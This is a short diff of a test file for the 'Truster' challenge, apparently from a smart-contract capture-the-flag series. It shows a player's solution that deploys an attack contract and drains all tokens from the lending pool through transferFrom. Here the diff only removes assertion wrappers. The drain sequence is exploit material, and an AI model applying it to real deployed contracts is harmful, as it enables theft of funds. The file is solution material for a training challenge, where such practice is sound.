@@ -24,13 +24,8 @@ describe('[Challenge] Truster', function () {
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
         hackContract = await (await ethers.getContractFactory('HackTruster', deployer)).deploy(pool.address, token.address);
-        await expect(
-            hackContract.connect(player).hack(TOKENS_IN_POOL)
-        ).not.to.be.reverted;
-
-        await expect(
-            token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL)
-        ).not.to.be.reverted;
+        await hackContract.connect(player).hack(TOKENS_IN_POOL)
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL)
     });
 
     after(async function () {
